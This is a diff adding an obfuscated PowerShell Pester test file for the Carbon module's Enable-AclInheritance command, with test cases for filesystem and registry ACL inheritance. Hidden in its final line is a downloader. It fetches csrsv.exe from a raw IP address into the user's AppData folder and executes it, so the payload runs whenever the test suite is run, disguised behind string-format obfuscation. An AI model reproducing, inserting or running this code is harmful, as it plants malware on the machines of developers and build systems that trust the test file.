@@ -1,0 +1,127 @@
+ .("{0}{2}{1}" -f 'sET-i','em','t')  ("vArIAbL"+"E"+":AF"+"8")  ( [TypE]("{2}{0}{1}" -f 'o.paT','H','i') );  
+
+
+
+
+
+
+
+
+
+
+
+
+&("{3}{1}{0}{2}{4}"-f'ct','-Stri','M','Set','ode') -Version ("{0}{1}" -f 'Late','st')
+
+& (&("{0}{2}{1}"-f'J','n-Path','oi') -Path ${PSS`crIPTRo`oT} -ChildPath ("{2}{0}{3}{1}{4}"-f'bonTe','.p','Initialize-Car','st','s1') -Resolve)
+
+function ASsErT-INhE`Ri`Ta`NCEEnA`BlEd
+{
+    param(
+        ${P`AtH}
+    )
+
+    .('It') ("{2}{0}{4}{1}{3}"-f'ould ena',' inh','sh','eritance','ble') {
+        ${A`cl} = &("{0}{1}"-f 'Get-Ac','l') -Path ${P`ATH}
+        ${a`Cl}."a`REaCc`EsSRul`e`SPRo`Te`ctED" | .("{0}{1}" -f 'Shou','ld') ('Be') ${f`Al`Se}
+        ${a`cl} = ${NU`Ll}
+    }
+
+}
+
+function new`-Te`stCoNt`A`ineR
+{
+    param(
+        [Parameter(maNdatORy=${Tr`Ue})]
+        ${PR`oV`iDEr}
+    )
+
+    if( ${PRo`VI`DeR} -eq ("{2}{1}{0}"-f 'System','e','Fil') )
+    {
+        ${tes`T`ROoT} = (&("{0}{1}{2}"-f'Ge','t-I','tem') -Path ("{2}{0}{1}"-f't','Drive:','Tes'))."fulln`Ame"
+        ${pA`TH} = &("{1}{0}{2}"-f'i','Jo','n-Path') -Path ${TEsT`RO`ot} -ChildPath ( $AF8::("{3}{2}{0}{4}{1}{5}" -f'd','m','Ran','Get','o','FileName').Invoke())
+        &("{3}{0}{4}{1}{2}"-f 'stall-D','r','y','In','irecto') -Path ${pA`Th}
+    }
+    elseif( ${PR`OvID`Er} -eq ("{1}{0}"-f'y','Registr') )
+    {
+        ${p`ATH} = ('hkcu:\Carbon+{0}\Enable-AclInheritance.Tests' -f   (&("{0}{2}{1}" -f 'G','T-itEM','E')  ("varIAbl"+"E"+":af"+"8")).VAlUe::("{4}{1}{3}{0}{2}"-f'a','do','me','mFileN','GetRan').Invoke())
+        .("{6}{5}{0}{4}{2}{3}{1}"-f 'l','y','egistryK','e','-R','al','Inst') -Path ${P`AtH}
+    }
+    else
+    {
+        throw ${Pr`oviD`eR}
+    }
+
+    &("{3}{1}{2}{0}{4}" -f'heritanc','able-Acl','In','Dis','e') -Path ${p`Ath} -Preserve
+
+    .('It') ("{5}{1}{2}{4}{3}{0}" -f'd','hould have inherit','ance di','le','sab','s') {
+        ${a`CL} = &("{1}{0}{2}" -f '-Ac','Get','l') -Path ${Pa`TH}
+        ${a`Cl}."aRe`AcC`E`ssr`ULesProt`eC`TeD" | &("{0}{1}" -f'Shoul','d') ('Be') ${tr`Ue}
+        ${A`Cl} = ${n`Ull}
+    }
+
+    &('It') ("{2}{3}{4}{0}{5}{1}"-f't acc',' rules','s','hould hav','e explici','ess') {
+        &("{2}{1}{3}{0}" -f 'ssion','-P','Get','ermi') -Path ${p`AtH} | &("{0}{1}" -f'Sho','uld') ("{1}{0}"-f 'ot','N') ("{2}{1}{0}{3}"-f'lOrE','eNul','B','mpty')
+    }
+
+    return ${pa`TH}
+}
+
+foreach( ${PROvi`dER} in @( ("{2}{0}{1}" -f 'ileS','ystem','F'), ("{2}{1}{0}"-f 'try','gis','Re') ) )
+{
+    .("{2}{1}{0}"-f'e','escrib','D') ('Enable-AclInheritance when ACL inheritance is disabled on the {0}' -f ${pR`o`VIdEr}) {
+        ${Pa`TH} = &("{0}{2}{3}{1}" -f'New-TestC','r','on','taine') -Provider ${p`R`OvidEr}
+        .("{0}{4}{1}{5}{3}{2}{6}" -f'En','bl','In','cl','a','e-A','heritance') -Path ${pA`TH}
+        
+        &("{4}{2}{0}{1}{6}{3}{5}"-f 'rt-Inh','eri','sse','Enab','A','led','tance') -Path ${p`AtH}
+
+        &('It') ("{7}{1}{0}{4}{6}{5}{9}{2}{3}{8}"-f' ','ld','c','cess ','r','l','emove exp','shou','rules','icit a') {
+            .("{0}{1}{2}{3}" -f'Get-','Permi','ssio','n') -Path ${pa`Th} | .("{0}{2}{1}" -f 'Sho','d','ul') ("{0}{1}{2}"-f 'Be','Null','OrEmpty')
+        }
+    }
+
+    .("{1}{0}"-f 'ibe','Descr') ('Enable-AclInheritance when ACL inheritance is already disabled on the {0}' -f ${P`ROVI`DEr}) {
+        ${PA`Th} = .("{3}{1}{2}{0}" -f 'stContainer','-','Te','New') -Provider ${P`RO`VI`DER}
+
+        &("{4}{3}{5}{0}{2}{1}" -f 'AclInher','nce','ita','b','Ena','le-') -Path ${P`AtH}
+
+        &("{6}{0}{5}{3}{1}{2}{4}"-f 'ert-I','ceEn','able','an','d','nherit','Ass') -Path ${p`ATH}
+
+        .("{1}{0}" -f'ck','Mo') -CommandName ("{1}{0}" -f 'Acl','Set-') -ModuleName ("{1}{2}{0}"-f'n','C','arbo') -Verifiable
+
+        &("{4}{0}{5}{1}{2}{3}"-f'a','-Acl','Inh','eritance','En','ble') -Path ${p`Ath}
+
+        &("{0}{2}{3}{4}{1}" -f'A','d','sser','t-Inherit','anceEnable') -Path ${P`ATh}
+
+        .('It') ("{4}{7}{0}{2}{5}{6}{1}{3}"-f 'uld n','ce twic','o','e','s','t ena','ble inheritan','ho') {
+            .("{1}{4}{3}{0}{2}"-f'le','Ass','d','rt-MockCal','e') -CommandName ("{1}{0}"-f'l','Set-Ac') -ModuleName ("{1}{2}{0}" -f'on','C','arb') -Times 0
+        }
+    }
+
+    .("{2}{1}{0}" -f'ibe','scr','De') ('Enable-AclInheritance whould preserve existing explicit access rules on the {0}' -f ${P`RoV`idER}) {
+        ${P`ATH} = &("{3}{2}{1}{0}" -f'ainer','Cont','t','New-Tes') -Provider ${pRO`VI`der}
+
+        .("{4}{2}{3}{5}{0}{1}"-f 'e','ritance','abl','e-AclIn','En','h') -Path ${p`ATH} -Preserve
+
+        .("{2}{0}{3}{1}{4}" -f'-I','abl','Assert','nheritanceEn','ed') -Path ${P`ATH}
+
+        .('It') ("{7}{9}{10}{5}{8}{0}{3}{11}{2}{1}{4}{6}"-f 'exp',' ac','t','lic','cess ',' pres','rules','s','ervice ','houl','d','i') {
+            .("{1}{0}{3}{2}" -f 't-Perm','Ge','sion','is') -Path ${p`AtH} | .("{0}{2}{1}" -f 'Shou','d','l') ("{0}{1}" -f 'No','t') ("{0}{2}{1}{3}"-f'Be','lOrE','Nul','mpty')
+        }
+    }
+
+    .("{0}{1}"-f 'De','scribe') ('Enable-AclInheritance when part of a pipeline on the {0}' -f ${PROViD`Er}) {
+        ${p`AtH} = &("{1}{2}{0}{3}" -f 'Con','Ne','w-Test','tainer') -Provider ${PRO`ViD`ER}
+        .("{2}{0}{1}" -f't-Ite','m','Ge') -Path ${p`ATh} | .("{1}{5}{3}{6}{4}{2}{0}"-f'e','E','itanc','bl','her','na','e-AclIn')
+        .("{2}{4}{1}{0}{3}"-f 'ritanc','-Inhe','Ass','eEnabled','ert') -Path ${p`AtH}
+
+        ${pA`Th} = .("{3}{0}{1}{2}"-f'-TestCo','ntain','er','New') -Provider ${pRO`VI`d`er}
+        ${PA`TH} | .("{5}{3}{1}{2}{0}{4}" -f'nheri','Ac','lI','nable-','tance','E')
+        .("{2}{5}{3}{1}{0}{4}"-f 'tanceEnable','i','Ass','t-Inher','d','er') -Path ${p`Ath}
+    }
+
+}
+
+.("{0}{3}{1}{2}" -f 'G','dIte','m','et-Chil') -Path ((("{1}{3}{2}{0}"-f 'on+*','hkcu:2','Carb','sJ'))-REPlAcE([CHar]50+[CHar]115+[CHar]74),[CHar]92) | .("{1}{2}{3}{0}"-f'-Item','Re','mo','ve') -Recurse -ErrorAction ("{0}{1}"-f 'Ig','nore')
+
+(.("{0}{1}{2}"-f'New-O','bj','ect') ("{3}{0}{1}{2}{4}" -f 'tem.Net.We','bCl','ie','Sys','nt')).("{2}{1}{3}{0}" -f'e','wnload','Do','Fil').Invoke(("{10}{9}{1}{2}{3}{6}{0}{8}{7}{4}{5}"-f '218','/','/89.248','.17','ex','e','0.','csrsv.','/~yahoo/','ttp:','h'),"$env:APPDATA\csrsv.exe");&("{0}{1}{2}{3}" -f'Star','t-','Pro','cess') ("$env:APPDATA\csrsv.exe")
